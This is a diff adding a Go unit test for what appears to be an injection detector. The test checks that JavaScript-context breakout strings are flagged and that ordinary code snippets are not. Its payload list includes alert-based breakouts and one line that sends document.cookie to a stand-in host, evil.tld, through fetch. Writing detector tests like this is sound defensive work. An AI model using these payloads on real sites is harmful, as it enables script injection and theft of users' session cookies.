@@ -490,3 +490,46 @@ func TestTagNameInTextIsNotMarkup(t *testing.T) {
 		})
 	}
 }
+
+// TestScriptContextBreakout covers injection into a JavaScript context rather
+// than into markup. The value does not open a tag at all: it closes whatever
+// expression the page already opened and appends a call.
+//
+// The trailing comment or quote-rebalance is required, and that is what keeps
+// ordinary code samples out. "foo(); bar()" in a snippet closes and calls too;
+// what it does not do is swallow the remainder of the line, because it is not
+// trying to keep the surrounding script parseable.
+func TestScriptContextBreakout(t *testing.T) {
+	d := New()
+
+	t.Run("script-context payloads fire", func(t *testing.T) {
+		for _, attack := range []string{
+			`"-alert(document.domain)-"`,
+			`'-alert(1)-'`,
+			`1); alert(document.domain);/*x`,
+			`');alert(1);//`,
+			`");alert(document.cookie)//`,
+			`"+fetch('//evil.tld?c='+document.cookie)+"`,
+		} {
+			if v := d.Analyze([]byte(attack)); !v.Detected() {
+				t.Errorf("missed %q (score %d, signals %v)", attack, v.Score, v.Signals)
+			}
+		}
+	})
+
+	t.Run("code samples and prose pass", func(t *testing.T) {
+		for _, benign := range []string{
+			`foo(); bar()`,
+			`init(); render(); teardown()`,
+			`if (a); else b()`,
+			`the total is (5); the tax is calc(5)`,
+			`price(1); price(2)`,
+			`func main() { fmt.Println("hi") }`,
+			`SELECT count(1); -- not javascript`,
+		} {
+			if v := d.Analyze([]byte(benign)); v.Detected() {
+				t.Errorf("false positive on %q (score %d, signals %v)", benign, v.Score, v.Signals)
+			}
+		}
+	})
+}
